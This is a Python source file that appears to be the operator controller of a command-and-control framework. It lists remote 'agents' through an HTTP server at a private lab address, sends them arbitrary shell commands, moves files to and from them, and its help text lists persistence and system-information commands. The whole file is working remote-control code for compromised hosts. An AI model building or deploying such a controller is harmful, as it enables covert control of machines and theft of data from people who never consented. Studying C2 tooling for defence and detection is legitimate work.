# controller.py
import requests # type: ignore
from requests.adapters import HTTPAdapter # pyright: ignore[reportMissingModuleSource]
from urllib3.util.retry import Retry # type: ignore
import time
import os

SERVER_URL = "http://192.168.56.1:5000"  # HTTP to match server config

# Session with retries and timeouts
session = requests.Session()
retry_strategy = Retry(total=5, backoff_factor=1, status_forcelist=[502, 503, 504])
session.mount('http://', HTTPAdapter(max_retries=retry_strategy))

def list_agents():
    try:
        res = session.get(f"{SERVER_URL}/agents", timeout=(10, 30))
        agents = res.json().get("agents", [])
        if not agents:
            print("[Controller] No agents connected.")
            return []
        print("\n[Controller] Connected Agents:")
        for idx, agent in enumerate(agents, 1):
            print(f"  {idx}. {agent['agent_id']} ({agent['os']}) [cwd: {agent['cwd']}] [last_seen: {agent['last_seen']}]")
        return agents
    except requests.exceptions.RequestException as e:
        print(f"[Controller Error] Could not fetch agents: {e}")
        return []

def agent_shell(agent_id, agent_os, cwd):
    while True:
        cmd = input(f"{agent_id}@{agent_os}:{cwd}> ").strip()
        if cmd.lower() in ["back", "exit", "quit"]:
            print(f"[Controller] Leaving agent {agent_id}.")
            break
        if cmd.startswith("upload "):
            _, local_path, remote_path = cmd.split()
            try:
                files = {'file': open(local_path, 'rb')}
                res = session.post(f"{SERVER_URL}/upload/{agent_id}", files=files, timeout=(10, 30))
                if res.status_code == 200:
                    task_id = res.json()["task_id"]
                    print(f"[Controller] Upload task assigned: ID {task_id} - File: {local_path} to {remote_path}")
                    result = None
                    while not result:
                        time.sleep(1)
                        r = session.get(f"{SERVER_URL}/get_report/{agent_id}/{task_id}", timeout=(10, 30))
                        if r.status_code == 200:
                            data = r.json()
                            result = data.get("result")
                            cwd = data.get("cwd", cwd)
                    print(f"[Controller] Report received for task {task_id}: {result.strip() if result else '[No response]'}")
                else:
                    print("[Controller Error] Upload failed")
            except Exception as e:
                print(f"[Controller Error] {e}")
            continue
        if cmd.startswith("download "):
            _, remote_path, local_path = cmd.split()
            res = session.post(f"{SERVER_URL}/assign/{agent_id}", json={"task": f"download {remote_path} {local_path}"}, timeout=(10, 30))
            if res.status_code == 200:
                task_id = res.json()["task_id"]
                print(f"[Controller] Download task assigned: ID {task_id} - From {remote_path} to {local_path}")
                result = None
                while not result:
                    time.sleep(1)
                    r = session.get(f"{SERVER_URL}/get_report/{agent_id}/{task_id}", timeout=(10, 30))
                    if r.status_code == 200:
                        data = r.json()
                        result = data.get("result")
                print(f"[Controller] Report received for task {task_id}: {result.strip() if result else '[No response]'}")
                dl_res = session.get(f"{SERVER_URL}/download/{agent_id}/{os.path.basename(remote_path)}", timeout=(10, 30))
                if dl_res.status_code == 200:
                    with open(local_path, 'wb') as f:
                        f.write(dl_res.content)
                    print(f"[Controller] Downloaded to {local_path}")
            continue
        # Standard command
        res = session.post(f"{SERVER_URL}/assign/{agent_id}", json={"task": cmd}, timeout=(10, 30))
        if res.status_code == 200:
            task_id = res.json()["task_id"]
            print(f"[Controller] Task assigned: ID {task_id} - Command: {cmd}")
            result = None
            while not result:
                time.sleep(1)
                r = session.get(f"{SERVER_URL}/get_report/{agent_id}/{task_id}", timeout=(10, 30))
                if r.status_code == 200:
                    data = r.json()
                    result = data.get("result")
                    cwd = data.get("cwd", cwd)
            print(f"[Controller] Report received for task {task_id}: {result.strip() if result else '[No response from agent]'}")
        else:
            print("[Controller Error] Failed to send command.")

def main():
    print("[*] Controller started. Type 'help' for commands.")
    while True:
        cmd = input("controller> ").strip()
        if cmd.lower() in ["exit", "quit"]:
            print("[Controller] Shutting down.")
            break
        elif cmd.lower() in ["help", "?"]:
            print("""
Available commands:
  list agents        - Show all connected agents
  use <agent_id>     - Interact with a specific agent
  exit / quit        - Quit the controller
In agent shell: upload <local> <remote>, download <remote> <local>, persist, sysinfo
""")
        elif cmd == "list agents":
            list_agents()
        elif cmd.startswith("use "):
            agent_id = cmd.split(" ", 1)[1].strip()
            agents = list_agents()
            agent = next((a for a in agents if a["agent_id"] == agent_id), None)
            if agent:
                agent_shell(agent["agent_id"], agent["os"], agent["cwd"])
            else:
                print("[Controller] Agent not found.")
        else:
            print("[Controller] Unknown command. Type 'help'.")

if __name__ == "__main__":
    main()